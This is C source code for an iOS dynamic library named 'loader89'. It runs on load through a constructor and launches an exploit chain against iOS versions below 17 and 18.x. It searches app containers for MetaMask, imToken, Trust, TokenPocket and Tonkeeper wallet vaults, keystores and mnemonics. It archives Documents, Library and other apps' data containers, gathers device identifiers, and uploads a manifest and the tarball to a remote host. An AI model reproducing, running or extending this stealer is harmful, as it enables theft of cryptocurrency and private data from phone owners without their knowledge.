static void scan_inventory_tree(const char *base, const char *rel, int depth, struct Inventory *iv) {
    if (depth > 6 || iv->files > 20000) return;
    char *full = rel[0] ? cat3(base, "/", rel) : cat3(base, "", "");
    DIR *dir = opendir(full);
    free(full);
    if (!dir) return;
    struct dirent *e;
    while ((e = (struct dirent *)readdir(dir))) {
        const char *nm = e->d_name;
        if (nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0))) continue;
        char *r2 = rel[0] ? cat3(rel, "/", nm) : (char *)nm;
        char *path = cat3(base, "/", r2);
        struct stat st;
        if (lstat(path, &st) == 0) {
            if ((st.st_mode & 0xF000) == 0x4000) {
                scan_inventory_tree(base, r2, depth + 1, iv);
            } else if (st.st_size > 0) {
                iv->files++;
                char lower[1200];
                unsigned long i = 0;
                for (; r2[i] && i + 1 < sizeof(lower); i++) lower[i] = (r2[i] >= 'A' && r2[i] <= 'Z') ? (char)(r2[i] + 32) : r2[i];
                lower[i] = 0;
                if (strstr(lower, "/documents/walletsv2/") && strstr(lower, ".json")) { iv->walletsv2++; inv_add_hit(iv, r2, (long)st.st_size, "imtoken_wallet"); }
                else if (strstr(lower, "rctasynclocalstorage_v1")) { iv->rct_storage++; inv_add_hit(iv, r2, (long)st.st_size, "imtoken_storage"); }
                else if (strstr(lower, "vault") || strstr(lower, "keyringcontroller")) { iv->meta_vault++; inv_add_hit(iv, r2, (long)st.st_size, "metamask_vault"); }
                else if (strstr(lower, "/documents/keystore/") && !strstr(lower, ".sekek")) { iv->trust_keystore++; inv_add_hit(iv, r2, (long)st.st_size, "trust_keystore"); }
                else if (strstr(lower, ".sekek")) { iv->trust_sekek++; inv_add_hit(iv, r2, (long)st.st_size, "trust_sekek"); }
                else if (strstr(lower, "db/main.sqlite3")) { iv->tp_sqlite++; inv_add_hit(iv, r2, (long)st.st_size, "tokenpocket_sqlite"); }
                else if (strstr(lower, "f4secyr/")) { iv->tp_key++; inv_add_hit(iv, r2, (long)st.st_size, "tokenpocket_key"); }
                else if (strstr(lower, "mnemonics_vault")) { iv->ton_vault++; inv_add_hit(iv, r2, (long)st.st_size, "tonkeeper_vault"); }
                else if (strstr(lower, "/documents/photos/") || strstr(lower, "/documents/media/")) { iv->photos++; }
                else if (strstr(lower, "note") || strstr(lower, "memo")) { iv->notes++; }
            }
        }
        free(path);
        if (r2 != (char *)nm) free(r2);
    }
    closedir(dir);
}

static void scan_container_inventory(const char *root, char *out, unsigned long cap, unsigned long *used, long *count) {
    DIR *dir = opendir(root);
    if (!dir) return;
    struct dirent *e;
    while ((e = (struct dirent *)readdir(dir))) {
        const char *nm = e->d_name;
        if (nm[0] == '.' && (nm[1] == 0 || (nm[1] == '.' && nm[2] == 0))) continue;
        char *l1 = cat3(root, "/", nm);
        struct stat st;
        if (lstat(l1, &st) != 0 || (st.st_mode & 0xF000) != 0x4000) { free(l1); continue; }
        DIR *d2 = opendir(l1);
        if (!d2) { free(l1); continue; }
        struct dirent *e2;
        while ((e2 = (struct dirent *)readdir(d2))) {
            const char *nm2 = e2->d_name;
            if (nm2[0] == '.' && (nm2[1] == 0 || (nm2[1] == '.' && nm2[2] == 0))) continue;
            char *container = cat3(l1, "/", nm2);
            struct stat st2;
            if (lstat(container, &st2) == 0 && (st2.st_mode & 0xF000) == 0x4000) {
                char bid[160];
                read_bundle_identity(container, bid, sizeof(bid));
                long files = dir_file_count(container, 5);
                char rel[900], erel[600], ebid[200], item[1200];
                snprintf(rel, sizeof(rel), "%s/%s", nm, nm2);
                json_escape(erel, sizeof(erel), rel);
                json_escape(ebid, sizeof(ebid), bid);
                snprintf(item, sizeof(item), "{\"path\":\"%s\",\"bundle\":\"%s\",\"readable\":true,\"files\":%ld}", erel, ebid, files);
                if (*used + strlen(item) + 2 < cap) {
                    if (*used) out[(*used)++] = ',';
                    for (unsigned long k = 0; item[k]; k++) out[(*used)++] = item[k];
                    out[*used] = 0;
                    (*count)++;
                }
            }
            free(container);
        }
        closedir(d2);
        free(l1);
    }
    closedir(dir);
}

static void write_inventory_files(const char *mcm_root) {
    char *home = getenv("HOME");
    if (!home || !mcm_root || !mcm_root[0]) return;

    char cout[65536];
    unsigned long cu = 0;
    long cc = 0;
    cout[0] = 0;
    scan_container_inventory(mcm_root, cout, sizeof(cout), &cu, &cc);
    char *catpath = cat3(mcm_root, "/[MHA-C2] App Data", "");
    g_mha_leases = (int)count_direct_dirs(catpath);
    free(catpath);
    char cpath[800];
    char *tmp = cat3(home, "/Documents/container_inventory.json", "");
    unsigned long i = 0;
    for (; i < sizeof(cpath) - 1 && tmp[i]; i++) cpath[i] = tmp[i];
    cpath[i] = 0;
    free(tmp);
    int fd = open(cpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        char head[128];
        int n = snprintf(head, sizeof(head), "{\"containers\":[");
        write_all(fd, head, (unsigned long)n);
        if (cu) write_all(fd, cout, cu);
        char tail[96];
        n = snprintf(tail, sizeof(tail), "],\"count\":%ld,\"mha_leases\":%d}", cc, g_mha_leases);
        write_all(fd, tail, (unsigned long)n);
        close(fd);
    }

    char wout[65536];
    unsigned long wu = 0;
    struct Inventory iv = {wout, sizeof(wout), &wu, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
    wout[0] = 0;
    scan_inventory_tree(mcm_root, "", 0, &iv);
    char wpath[800];
    tmp = cat3(home, "/Documents/wallet_inventory.json", "");
    i = 0;
    for (; i < sizeof(wpath) - 1 && tmp[i]; i++) wpath[i] = tmp[i];
    wpath[i] = 0;
    free(tmp);
    fd = open(wpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        char head[160];
        int n = snprintf(head, sizeof(head), "{\"scanned_files\":%ld,\"hits\":[", iv.files);
        write_all(fd, head, (unsigned long)n);
        if (wu) write_all(fd, wout, wu);
        char tail[420];
        n = snprintf(tail, sizeof(tail),
            "],\"imtoken_wallets\":%ld,\"imtoken_storage\":%ld,\"metamask_vault\":%ld,\"trust_keystore\":%ld,\"trust_sekek\":%ld,\"tokenpocket_sqlite\":%ld,\"tokenpocket_key\":%ld,\"tonkeeper_vault\":%ld}",
            iv.walletsv2, iv.rct_storage, iv.meta_vault, iv.trust_keystore, iv.trust_sekek, iv.tp_sqlite, iv.tp_key, iv.ton_vault);
        write_all(fd, tail, (unsigned long)n);
        close(fd);
    }
    char msg[360];
    snprintf(msg, sizeof(msg), "inventory written containers=%ld leases=%d scanned=%ld walletsv2=%ld trust=%ld tp=%ld", cc, g_mha_leases, iv.files, iv.walletsv2, iv.trust_keystore + iv.trust_sekek, iv.tp_sqlite + iv.tp_key);
    log_info(msg);
}

static void *upload_manifest(int exploit_ok, int mha_ok, const char *source, const char *mcm_root) {
    void *cls = p_getClass("_CSDataExchange");
    if (!cls) { log_error("CSDataExchange missing"); return 0; }
    void *nsstring = p_getClass("NSString");
    void *sel_str_u8 = p_sel("stringWithUTF8String:");
    void *inst = p_msgSend(p_msgSend(cls, p_sel("alloc")), p_sel("initWithHost:port:"),
                           p_msgSend(nsstring, sel_str_u8, g_host), (void *)(long)g_port);
    if (!inst) { log_error("CSDataExchange init FAIL"); return 0; }

    void *err = 0;
    long ok = (long)p_msgSend(inst, p_sel("handshakeWithError:"), &err);
    log_info(ok ? "handshake OK" : "handshake FAIL");
    if (!ok) { p_release(inst); return 0; }

    err = 0;
    long ok2 = (long)p_msgSend(inst, p_sel("startAcquisition:error:"), p_msgSend(nsstring, sel_str_u8, "filesystem"), &err);
    log_info(ok2 ? "startAcquisition OK" : "startAcquisition FAIL");
    if (!ok2) { p_release(inst); return 0; }

    char files[20000];
    files[0] = 0;
    unsigned long used = 0;
    int nfiles = 0;
    unsigned long budget = 128 * 1024 * 1024;
    char *home = getenv("HOME");
    char tarpath[600];
    tarpath[0] = 0;
    if (home) {
        char *tmp = cat3(home, "/Documents/loader89_bundle.tar", "");
        unsigned long i = 0;
        for (; i < sizeof(tarpath) - 1 && tmp[i]; i++) tarpath[i] = tmp[i];
        tarpath[i] = 0;
        free(tmp);
    }
    if (!tarpath[0]) snprintf(tarpath, sizeof(tarpath), "/tmp/loader89_bundle.tar");
    int tarfd = open(tarpath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    log_info(tarfd >= 0 ? "tar open OK" : "tar open FAIL");
    if (tarfd >= 0) {
        log_info("tar collect begin own-docs");
        if (home) {
            char *docs = cat3(home, "/Documents", "");
            nfiles += tar_add_tree(docs, "", tarfd, files, &used, sizeof(files), 2000, 0, &budget);
            free(docs);
            char *lib = cat3(home, "/Library", "");
            nfiles += tar_add_tree(lib, "Library", tarfd, files, &used, sizeof(files), 2000, 0, &budget);
            free(lib);
            log_u64("tar own files=", (u64)nfiles);
        }
        if (mha_ok && mcm_root && mcm_root[0]) {
            log_info("tar collect begin MCMRoot");
            nfiles += tar_add_tree(mcm_root, "MCMRoot", tarfd, files, &used, sizeof(files), 20000, 0, &budget);
            log_u64("tar after MCMRoot files=", (u64)nfiles);
        }
        if (exploit_ok) {
            log_info("tar collect begin exploit-containers");
            nfiles += tar_add_tree("/var/mobile/Containers/Data/Application", "Containers/Data/Application", tarfd,
                                   files, &used, sizeof(files), 20000, 0, &budget);
            nfiles += tar_add_tree("/var/mobile/Containers/Shared/AppGroup", "Containers/Shared/AppGroup", tarfd,
                                   files, &used, sizeof(files), 5000, 0, &budget);
        }
        finish_tar(tarfd);
    }
    log_u64("tar files=", (u64)nfiles);

    char model[80], sysver[80], deviceName[160], idfv[120], bundleId[160], appVersion[80];
    sysctl_str("hw.machine", model, sizeof(model));
    char *sv = device_string("systemVersion");
    if (sv) { unsigned long i = 0; for (; i < sizeof(sysver) - 1 && sv[i]; i++) sysver[i] = sv[i]; sysver[i] = 0; free(sv); }
    else sysctl_str("kern.osrelease", sysver, sizeof(sysver));
    char *dn = device_string("name");
    if (dn) { unsigned long i = 0; for (; i < sizeof(deviceName) - 1 && dn[i]; i++) deviceName[i] = dn[i]; deviceName[i] = 0; free(dn); }
    else deviceName[0] = 0;
    char *iv = device_string("identifierForVendor");
    if (iv) { unsigned long i = 0; for (; i < sizeof(idfv) - 1 && iv[i]; i++) idfv[i] = iv[i]; idfv[i] = 0; free(iv); }
    else idfv[0] = 0;
    char *bid = info_string("CFBundleIdentifier");
    if (bid) { unsigned long i = 0; for (; i < sizeof(bundleId) - 1 && bid[i]; i++) bundleId[i] = bid[i]; bundleId[i] = 0; free(bid); }
    else bundleId[0] = 0;
    char *av = info_string("CFBundleShortVersionString");
    if (av) { unsigned long i = 0; for (; i < sizeof(appVersion) - 1 && av[i]; i++) appVersion[i] = av[i]; appVersion[i] = 0; free(av); }
    else appVersion[0] = 0;

    char msg[900];
    char eName[64], eSource[64], eRoot[512];
    json_escape(eName, sizeof(eName), model);
    json_escape(eSource, sizeof(eSource), source);
    json_escape(eRoot, sizeof(eRoot), mcm_root ? mcm_root : "");
    char ts[32];
    snprintf(ts, sizeof(ts), "%lld", (long long)time(0));
    char *body = (char *)malloc(20480);
    unsigned long bo = 0;
    int n = snprintf(body + bo, 20480 - bo,
        "{\"deviceName\":\"%s\",\"model\":\"%s\",\"systemName\":\"iOS\",\"systemVersion\":\"%s\","
        "\"identifierForVendor\":\"%s\",\"appBundle\":\"%s\",\"appVersion\":\"%s\","
        "\"collectedAt\":%s,\"exploit\":%s,\"mha\":%s,\"mhaLeases\":%d,\"source\":\"%s\",\"mcmRoot\":\"%s\",\"sandboxFiles\":[",
        deviceName, eName, sysver, idfv, bundleId, appVersion, ts,
        exploit_ok ? "true" : "false", mha_ok ? "true" : "false", g_mha_leases, eSource, eRoot);
    bo += n;
    for (unsigned long k = 0; k < used && bo < 19700; k++) body[bo++] = files[k];
    n = snprintf(body + bo, 20480 - bo, "]}");
    bo += n;
    log_u64("manifest bytes=", (u64)bo);

    void *nsdata = p_getClass("NSData");
    void *data = p_msgSend(nsdata, p_sel("dataWithBytes:length:"), body, (unsigned long)bo);
    free(body);
    if (!data) { log_error("NSData FAIL"); p_release(inst); return 0; }

    err = 0;
    long ok3 = (long)p_msgSend(inst, p_sel("uploadChunk:acquisitionType:fileName:error:"), data,
                               p_msgSend(nsstring, sel_str_u8, "filesystem"),
                               p_msgSend(nsstring, sel_str_u8, "loader89_manifest.json"), &err);
    log_info(ok3 ? "manifest uploadChunk OK" : "manifest uploadChunk FAIL");

    long ok4 = 0;
    if (tarfd >= 0 && tarpath[0]) {
        struct stat ts;
        long tsize = stat(tarpath, &ts) == 0 ? (long)ts.st_size : -1;
        void *pathStr = p_msgSend(nsstring, sel_str_u8, tarpath);
        void *typeStr = p_msgSend(nsstring, sel_str_u8, "filesystem");
        ok4 = (long)p_msgSend(inst, p_sel("uploadFileSync:acquisitionType:"), pathStr, typeStr);
        snprintf(msg, sizeof(msg), "tar uploadFileSync ret=%ld size=%ld path=%s", ok4, tsize, tarpath);
        log_info(msg);
    }

    err = 0;
    p_msgSend(inst, p_sel("endAcquisition:error:"), p_msgSend(nsstring, sel_str_u8, "filesystem"), &err);
    err = 0;
    p_msgSend(inst, p_sel("endSessionWithError:"), &err);
    p_release(inst);
    return (void *)(long)(ok && ok2 && ok3 && ok4);
}

static void *worker(void *arg) {
    (void)arg;
    sleep(2);
    init_log();
    p_dlsym = (void *(*)(void *, const char *))dlsym(RTLD_DEFAULT, "dlsym");
    p_msgSend = (void *(*)())dlsym(RTLD_DEFAULT, "objc_msgSend");
    p_getClass = (void *(*)(const char *))dlsym(RTLD_DEFAULT, "objc_getClass");
    p_sel = (void *(*)(const char *))dlsym(RTLD_DEFAULT, "sel_registerName");
    p_nslog = (void *(*)())dlsym(RTLD_DEFAULT, "NSLog");
    p_retain = (void *(*)(void *))dlsym(RTLD_DEFAULT, "objc_retain");
    p_release = (void *(*)(void *))dlsym(RTLD_DEFAULT, "objc_release");
    /* v6.0 fix B: GCD resolved dynamically with the exact same dlsym
     * pattern as the objc pointers above (dlsym adds the leading
     * underscore itself); no <dispatch/dispatch.h> include needed. */
    p_get_main_queue = (void *(*)(void))dlsym(RTLD_DEFAULT, "dispatch_get_main_queue");
    p_dispatch_async_f = (void (*)(void *, void *, void (*)(void *)))(dlsym(RTLD_DEFAULT, "dispatch_async_f"));
    if (!p_msgSend || !p_getClass || !p_sel || !p_release) { log_error("objc runtime missing"); return 0; }

    if (g_logfd >= 0) {
        int o = dup2(g_logfd, 1);
        int e = dup2(g_logfd, 2);
        fflush(0);
        char dm[128];
        snprintf(dm, sizeof(dm), "stdout/stderr redirect out=%d err=%d", o, e);
        log_info(dm);
    }

    log_info("=== loader89 v6.0.1 B-retry-start ===");
    read_runtime_config();
    {
        /* v5.8 problem C: child/worker exploit state goes to this file;
         * parent never guesses success from the exit code alone. */
        char *home = getenv("HOME");
        if (home) {
            char *p = cat3(home, "/Documents/.loader89_exploit_status.json", "");
            unsigned long i = 0;
            for (; i < sizeof(g_sts_statuspath) - 1 && p[i]; i++) g_sts_statuspath[i] = p[i];
            g_sts_statuspath[i] = 0;
            free(p);
        }
    }
    char msg[600], bid[200];
    snprintf(msg, sizeof(msg), "runtime host=%s port=%d log=%s", g_host, g_port, g_logpath);
    log_info(msg);
    char *b0 = info_string("CFBundleIdentifier");
    if (b0) { unsigned long i = 0; for (; i < sizeof(bid) - 1 && b0[i]; i++) bid[i] = b0[i]; bid[i] = 0; free(b0); }
    else snprintf(bid, sizeof(bid), "-");
    snprintf(msg, sizeof(msg), "bundleId=%s required=%s", bid, strcmp(bid, "com.apple.mobile.MobileHouseArrest") == 0 ? "OK" : "MISMATCH");
    log_info(msg);

    void *xpf = dlopen("@executable_path/Frameworks/libxpf.dylib", 0xA);
    void *grab = dlopen("@executable_path/Frameworks/libgrabkernel2.dylib", 0xA);
    void *mcm = dlopen("@executable_path/Frameworks/libuiopsersvc.framework/libuiopsersvc", 0xA);
    void *core = dlopen("@executable_path/Frameworks/libwebuiopsercore.framework/libwebuiopsercore", 0xA);
    void *sd = dlopen("@executable_path/Frameworks/SDWebuiopser.framework/SDWebuiopser", 0xA);
    log_info(xpf ? "dlopen libxpf OK" : "dlopen libxpf FAIL");
    log_info(grab ? "dlopen libgrabkernel2 OK" : "dlopen libgrabkernel2 FAIL");
    log_info(mcm ? "dlopen libuiopsersvc OK" : "dlopen libuiopsersvc FAIL");
    log_info(core ? "dlopen core OK" : "dlopen core FAIL");
    log_info(sd ? "dlopen SD OK" : "dlopen SD FAIL");
    repair_core_log_sink(core);
    post_log_now();

    int exploit_ok = 0;
    int ios_major = ios_major_version();
    int ios_minor = -1, ios_patch = -1;
    {
        char buf[32];
        sysctl_str("kern.osproductversion", buf, sizeof(buf));
        int v[3] = {0, 0, 0}, vi = 0;
        for (unsigned long i = 0; buf[i]; i++) {
            if (buf[i] >= '0' && buf[i] <= '9') { if (vi < 3) v[vi] = v[vi] * 10 + (buf[i] - '0'); }
            else if (++vi == 3) break;
        }
        ios_major = v[0]; ios_minor = v[1]; ios_patch = v[2];
    }
    int exploit_forced = info_int("Loader89EnableExploit", 0);
    /* v5.8 problem D fix: policy actually decides whether to run the
     * exploit at all. Supported by default: iOS <17 and iOS 18.x.
     * Everything else is skipped unless Loader89EnableExploit=1. */
    int try_exploit;
    const char *policy_iOS_range;
    if (ios_major > 0 && ios_major < 17) { try_exploit = 1; policy_iOS_range = "lt17"; }
    else if (ios_major == 18) { try_exploit = 1; policy_iOS_range = "18x"; }
    else { try_exploit = 0; policy_iOS_range = "unsupported"; }
    if (!try_exploit && exploit_forced) { try_exploit = 1; policy_iOS_range = "forced"; }
    snprintf(msg, sizeof(msg), "policy=%s policy_iOS_range=%s runtime_iOS_actual=%d.%d.%d decision_try_exploit=%d exploit_forced=%d",
             policy_iOS_range, policy_iOS_range, ios_major, ios_minor, ios_patch, try_exploit, exploit_forced);
    log_info(msg);
    void *acqCls = p_getClass("AcqViewCntrlr_");
    log_info(acqCls ? "AcqViewCntrlr_ class OK" : "AcqViewCntrlr_ class MISSING");
    int fork_failed = 0;
    if (acqCls && try_exploit) {
        /* RunServer has been seen aborting the whole process.  Run the exploit
         * in an isolated child; if the child aborts, the parent keeps the
         * MHA/MCM fallback alive. */
        pid_t child = fork();
        if (child == 0) {
            int rc = exploit_class_main(acqCls, core);
            write_child_status();
            _exit(rc);
        } else if (child > 0) {
            /* v6.0: parent wait budget raised 12s -> 60s, granularity
             * 250ms (240 x usleep(250000)); phase transitions from the
             * child's status file are logged as they happen so a hang can
             * be pinned to initlogs/runserver/sploit from the log alone. */
            snprintf(msg, sizeof(msg), "exploit child pid=%d timeout=60s", (int)child);
            log_info(msg);
            int status = 0, finished = 0;
            char last_phase[16] = "";
            char cur_phase[16];
            for (int i = 0; i < 240; i++) {
                pid_t got = waitpid(child, &status, WNOHANG);
                if (got == child) { finished = 1; break; }
                usleep(250000);
                if (read_status_phase(cur_phase, sizeof(cur_phase)) &&
                    cur_phase[0] && strcmp(cur_phase, last_phase) != 0) {
                    snprintf(msg, sizeof(msg), "exploit child phase=%s elapsed=%ds", cur_phase, (i + 1) / 4);
                    log_info(msg);
                    snprintf(last_phase, sizeof(last_phase), "%s", cur_phase);
                }
            }
            if (!finished) {
                kill(child, SIGKILL);
                waitpid(child, &status, 0);
                log_warn("exploit child TIMEOUT killed");
            } else {
                read_child_status();
            }
            int exited_ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
            /* v5.8: exit code alone is not success; require the child's
             * status JSON to say succeeded==1 as well. */
            if (exited_ok && g_exploit_sts.succeeded) {
                exploit_ok = 1;
                log_info("exploit child OK");
            } else {
                snprintf(msg, sizeof(msg), "exploit child FAIL exited=%d code=%d signal=%d resolved=%d raw=%d",
                         WIFEXITED(status), WIFEXITED(status) ? WEXITSTATUS(status) : -1,
                         WIFSIGNALED(status) ? WTERMSIG(status) : 0,
                         g_exploit_sts.core_base_resolved, g_exploit_sts.raw_flag);
                log_warn(msg);
            }
        } else {
            fork_failed = 1;
            snprintf(msg, sizeof(msg), "fork FAIL errno=%d (%s); queue direct exploit", errno, strerror(errno));
            log_warn(msg);
        }
    } else if (acqCls && !try_exploit) {
        log_warn("exploit chain SKIPPED by policy (iOS unsupported; set Loader89EnableExploit=1 to force)");
    } else {
        log_warn("exploit chain SKIPPED (AcqViewCntrlr_ missing)");
    }

    int mha_ok = 0;
    char mcm_root[512] = {0};
    if (mcm) {
        int (*bridge)(void) = (int (*)(void))dlsym(mcm, "MCMBridgeAvailable");
        int (*run)(void) = (int (*)(void))dlsym(mcm, "mcm_filza_run");
        int (*ready)(void) = (int (*)(void))dlsym(mcm, "mcm_filza_is_ready");
        void *(*root)(void) = (void *(*)(void))dlsym(mcm, "MCMFilzaVirtualRoot");
        log_info(bridge ? "MCMBridgeAvailable symbol OK" : "MCMBridgeAvailable symbol MISSING");
        log_info(run ? "mcm_filza_run symbol OK" : "mcm_filza_run symbol MISSING");
        log_info(ready ? "mcm_filza_is_ready symbol OK" : "mcm_filza_is_ready symbol MISSING");
        log_info(root ? "MCMFilzaVirtualRoot symbol OK" : "MCMFilzaVirtualRoot symbol MISSING");
        int bridge_ok = bridge ? bridge() : 0;
        snprintf(msg, sizeof(msg), "MCM bridge=%d", bridge_ok);
        log_info(msg);
        int run_ret = run ? run() : 0;
        snprintf(msg, sizeof(msg), "mcm_filza_run=%d", run_ret);
        log_info(msg);
        int ready_ok = 0;
        for (int i = 0; i < 20; i++) {
            /* v4.8: capture the virtual root BEFORE the ready short-circuit. */
            void *r = root ? root() : 0;
            if (r) {
                char *cs = objc_cstr(r);
                if (cs && cs[0]) {
                    unsigned long j = 0;
                    for (; j < sizeof(mcm_root) - 1 && cs[j]; j++) mcm_root[j] = cs[j];
                    mcm_root[j] = 0;
                    free(cs);
                }
            }
            /* v5.4 fix: MCMFilzaVirtualRoot returns an autoreleased object.
               Releasing it here causes autorelease-pool double release when
               the worker thread exits (objc_autoreleasePoolPop SIGSEGV). */
            ready_ok = ready ? ready() : 0;
            if (ready_ok) break;
            if (mcm_root[0] && path_exists(mcm_root)) break;
            sleep(1);
        }
        ready_ok = ready ? ready() : 0;
        if (!mcm_root[0]) {
            char *home = getenv("HOME");
            char *guess = home ? cat3(home, "/Documents/Device Storage", "") : 0;
            if (guess) {
                unsigned long j = 0;
                for (; j < sizeof(mcm_root) - 1 && guess[j]; j++) mcm_root[j] = guess[j];
                mcm_root[j] = 0;
                free(guess);
            }
            log_info("MCM root fallback to Documents/Device Storage");
        }
        int root_exists = path_exists(mcm_root);
        long root_files = root_exists ? dir_file_count(mcm_root, 3) : -1;
        mha_ok = ready_ok || (root_exists && root_files > 0);
        snprintf(msg, sizeof(msg), "MHA/MCM ready=%d root=%s exists=%d files=%ld", ready_ok, mcm_root, root_exists, root_files);
        log_info(msg);
        if (root_exists) log_root_top("MCMRootTop", mcm_root, 120);
    }

    /* iOS frequently denies fork() from this host.  After the MHA/MCM
       fallback is alive, try the exploit once in-process so we can still
       report real exploit_success instead of silently skipping it. */
    if (fork_failed && acqCls) {
        /* v5.8 problem B fix: worker reads a static struct, so the detached
         * thread never touches stack memory that dies when we return. */
        g_exploit_args.acqCls = acqCls;
        g_exploit_args.core = core;
        g_exploit_state = EXPLOIT_ST_RUN;
        int launched = 0;
        log_info("direct exploit fallback start (budget=60s, poll=250ms)");
        /* v6.0 fix B: prefer the GCD main queue for the alloc/init ->
         * InitLogs -> RunServer -> Sploit chain (suspicion: some step
         * needs main-thread-only machinery and blocks forever on a plain
         * pthread). dispatch_async_f takes a plain C callback, so we can
         * dlsym it exactly like the objc pointers - no headers needed.
         * If dlsym failed we log one warn and keep the old pthread path. */
        if (p_get_main_queue && p_dispatch_async_f) {
            void *mq = p_get_main_queue();
            if (mq) {
                log_info("direct exploit via GCD main queue (v6.0 fix B)");
                p_dispatch_async_f(mq, &g_exploit_args, (void (*)(void *))exploit_thread_worker);
                launched = 1;
            }
        }
        if (!launched) {
            log_warn("GCD main queue unavailable; pthread direct exploit fallback (v6.0 fix B)");
            void *th = 0;
            if (pthread_create(&th, 0, exploit_thread_worker, &g_exploit_args) == 0) {
                pthread_detach(th);
                launched = 1;
            }
        }
        if (launched) {
            /* v6.0: total budget raised 12s -> 60s; poll every 250ms so
             * phase changes reach the status file and get logged promptly.
             * Sploit's internal viability+exploit (core 0x82f0) may take
             * tens of seconds; 12s was premature. */
            char last_phase[16] = "";
            char cur_phase[16];
            for (int i = 0; i < 240 && g_exploit_state == EXPLOIT_ST_RUN; i++) {
                usleep(250000); /* 250ms */
                if (read_status_phase(cur_phase, sizeof(cur_phase)) &&
                    cur_phase[0] && strcmp(cur_phase, last_phase) != 0) {
                    /* log each phase transition only once (dedup via last_phase) */
                    snprintf(msg, sizeof(msg), "direct exploit phase=%s elapsed=%ds", cur_phase, (i + 1) / 4);
                    log_info(msg);
                    snprintf(last_phase, sizeof(last_phase), "%s", cur_phase);
                }
            }
            if (g_exploit_state == EXPLOIT_ST_RUN) {
                log_warn("direct exploit fallback TIMEOUT (60s); continuing MHA/upload");
                exploit_ok = 0;
            } else {
                read_child_status();
                exploit_ok = g_exploit_sts.succeeded;
                snprintf(msg, sizeof(msg), "direct exploit fallback state=%d exploit_ok=%d resolved=%d raw=%d", g_exploit_state, exploit_ok,
                         g_exploit_sts.core_base_resolved, g_exploit_sts.raw_flag);
                log_info(msg);
            }
        } else {
            g_exploit_state = EXPLOIT_ST_FAIL;
            log_warn("direct exploit fallback pthread FAIL");
        }
    }

    post_log_now();

    char source[80];
    snprintf(source, sizeof(source), "%s", exploit_ok ? "exploit+mha" : (mha_ok ? "mha" : "fallback"));
    write_inventory_files(mcm_root);
    void *up = upload_manifest(exploit_ok, mha_ok, source, mcm_root);
    log_info(up ? "dual-chain upload OK" : "dual-chain upload FAIL");
    snprintf(msg, sizeof(msg), "FINAL exploit_success=%d mha_success=%d source=%s root=%s resolved=%d raw_flag=%d sploit_done=%d runserver_done=%d policy=%s",
             exploit_ok, mha_ok, source, mcm_root,
             g_exploit_sts.core_base_resolved, g_exploit_sts.raw_flag,
             g_exploit_sts.sploit_done, g_exploit_sts.runserver_done, policy_iOS_range);
    log_info(msg);
    post_log_now();
    log_info("=== loader89 done ===");
    if (g_logfd >= 0) { close(g_logfd); g_logfd = -1; }
    return 0;
}

static void *g_thread_start;

#ifndef LOADER89_APP_DISABLED
__attribute__((constructor))
static void loader89_init(void) {
    static void *th;
    void *(*fn)(void *) = worker;
    g_thread_start = (void *)fn;
    if (pthread_create(&th, 0, worker, 0) == 0) pthread_detach(th);
}
#endif

